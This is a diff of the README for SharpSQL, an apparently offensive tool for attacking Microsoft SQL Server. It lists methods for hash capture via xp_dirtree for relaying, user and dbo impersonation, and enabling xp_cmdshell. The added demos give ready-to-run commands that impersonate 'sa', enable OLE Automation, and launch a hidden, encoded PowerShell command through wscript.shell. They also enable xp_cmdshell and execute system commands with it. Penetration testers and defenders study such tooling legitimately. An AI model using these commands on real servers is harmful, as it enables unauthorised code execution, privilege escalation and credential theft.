@@ -21,34 +21,35 @@ Options:
     -LinkedInstance            - The linked instance to target
     -ip                        - The IP to xp_dirtree (share: /pwn)
     -User                      - The user to impersonate
-    -Command                   - The command to execute (default: whoami - Invoke-OSCmd and Invoke-LinkedOSCmd)
+    -Command                   - The command to execute (default: whoami - Invoke-OSCmd, Invoke-LinkedOSCmd, Invoke-ExternalScript, and Invoke-OLEObject)
     -Query                     - The raw SQL query to execute
-    -help                      - Show  help
+    -help                      - Show help
 
 Methods:
     Get-SQLInstanceDomain      - Get SQL instances within current domain via user and computer SPNs (no parameters required)
-    Get-Databases              - Get available databases (-Instance required)
-    Get-DBUser                 - Get database user via USER_NAME (-Instance required)
-    Get-GroupMembership        - Get group member for current user ('guest' or 'sysadmin') (-Instance required)
-    Get-Hash                   - Get hash via xp_dirtree (-Instance and -ip required)
-    Get-ImpersonableUsers      - Get impersonable users (-Instance required)
-    Get-LinkedServers          - Get linked SQL servers (-Instance required)
-    Get-LinkedPrivs            - Get current user privs for linked server (-Instance and -LinkedInstance required)
-    Get-Sysadmins              - Get sysadmin users (-Instance required)
-    Get-SystemUser             - Get system user via SYSTEM_USER (-Instance required)
-    Get-SQLQuery               - Execute raw SQL query (-Instance and -Query required)
-    Get-Triggers               - Get SQL server triggers (-Instance required)
-    Get-Users                  - Get users from syslogins (-Instance required)
-    Get-UserPrivs              - Get current user server privileges (-Instance required)
-    Check-Cmdshell             - Check whether xp_cmdshell is enabled on instance (-Instance required)
-    Check-LinkedCmdshell       - Check whether xp_cmdshell is enabled on linked server (-Instance and -LinkedInstance required)
-    Enable-Cmdshell            - Enable xp_cmdshell on instance (-Instance required)
-    Enable-LinkedCmdshell      - Enable xp_cmdshell on linked server (-Instance and -LinkedInstance required)
-    Invoke-OSCmd               - Execute system command via_xp_cmdshell on instance (-Instance required)
-    Invoke-LinkedOSCmd         - Executes system command via xp_cmdshell on linked server (-Instance and -LinkedInstance required)
-    Invoke-ExternalScript      - Invoke external python script command execution (-Instance required)
-    Invoke-OLEObject           - Invoke OLE wscript command execution (-Instance required)
-    Invoke-UserImpersonation   - Impersonate user (-Instance and -User required)
+    Get-Databases              - Get available databases
+    Get-DBUser                 - Get database user via USER_NAME
+    Get-GroupMembership        - Get group member for current user ('guest' or 'sysadmin')
+    Get-Hash                   - Get hash via xp_dirtree, works nicely with impacket-ntlmrelayx
+    Get-ImpersonableUsers      - Get impersonable users
+    Get-LinkedServers          - Get linked SQL servers
+    Get-LinkedPrivs            - Get current user privs for linked server
+    Get-Sysadmins              - Get sysadmin users
+    Get-SystemUser             - Get system user via SYSTEM_USER
+    Get-SQLQuery               - Execute raw SQL query
+    Get-Triggers               - Get SQL server triggers
+    Get-Users                  - Get users from syslogins
+    Get-UserPrivs              - Get current user server privileges
+    Check-Cmdshell             - Check whether xp_cmdshell is enabled on instance
+    Check-LinkedCmdshell       - Check whether xp_cmdshell is enabled on linked server
+    Enable-Cmdshell            - Enable xp_cmdshell on instance
+    Enable-LinkedCmdshell      - Enable xp_cmdshell on linked server
+    Invoke-OSCmd               - Execute system command via_xp_cmdshell on instance
+    Invoke-LinkedOSCmd         - Executes system command via xp_cmdshell on linked server
+    Invoke-ExternalScript      - Invoke external python script command execution
+    Invoke-OLEObject           - Invoke OLE wscript command execution
+    Invoke-UserImpersonation   - Impersonate user and execute query
+    Invoke-DBOImpersonation    - Impersonate dbo on msdb and execute query
 
 Examples:
 
@@ -62,7 +63,7 @@ Examples:
 ```
 
 
-## Demo
+## Demos and Examples
 ### Get-GroupMembership
 ![image](https://user-images.githubusercontent.com/47215311/153180706-78e2a53c-79fb-4db0-ba03-cda16d476966.png)
 
@@ -74,6 +75,21 @@ Examples:
 
 ### Invoke-OSCmd
 ![image](https://user-images.githubusercontent.com/47215311/153182593-e40747ff-b9f1-4ed4-a634-556f37e617ea.png)
+
+### OLE Object via Impersonation
+```
+.\SharpSQL.exe invoke-userimpersonation -instance dc01 -user sa -Query "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -exec bypass -nop -w hidden -enc blahblah';"
+```
+
+### Impersonation and xp_cmdshell
+```
+.\SharpSQL.exe invoke-userimpersonation -instance dc01 -user sa -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+
+.\SharpSQL.exe invoke-userimpersonation -instance dc01 -user sa -Query "EXEC xp_cmdshell 'whoami'"
+```
+
+
+
 
 
 
